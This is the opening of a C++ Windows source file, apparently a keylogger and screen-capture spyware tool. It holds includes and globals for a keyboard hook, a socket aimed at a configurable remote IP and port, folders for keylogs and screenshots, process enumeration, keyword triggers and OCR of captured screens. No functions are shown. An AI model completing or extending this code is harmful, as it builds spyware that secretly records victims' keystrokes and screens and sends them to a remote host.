#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <string>
#include <tesseract/baseapi.h>
#include <leptonica/allheaders.h>
#include <tlhelp32.h>  // For process enumeration
#include <set>
#include <direct.h>  // For _mkdir
#include <ctime>     // For current time and date
#include <gdiplus.h> // For image handling
#include <cstdio>    // For std::snprintf
#include <comdef.h>  // For COM
#include <memory>    // For smart pointers
#include <fstream>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

HHOOK hook;
SOCKET SendSocket;
sockaddr_in dest;
bool keyloggerActive = false;
bool keywordCheckNeeded = true; // Flag to manage keyword checking
HWND prevWindow = NULL;  // To store the handle of the previous window
std::set<DWORD> existingProcesses;  // To store the PIDs of currently running processes
std::string baseFolder; // Base folder to store both keylogs and screencaptures
bool capturedOnBoot = false; // Flag to check if screen has been captured on boot

// Configurable parameters
std::string remoteIP = "127.0.0.1"; // Default IP address
int remotePort = 12345; // Default port number
std::vector<std::string> keywords = { "PLACEHOLDER_KEYWORD" }; // Default keyword
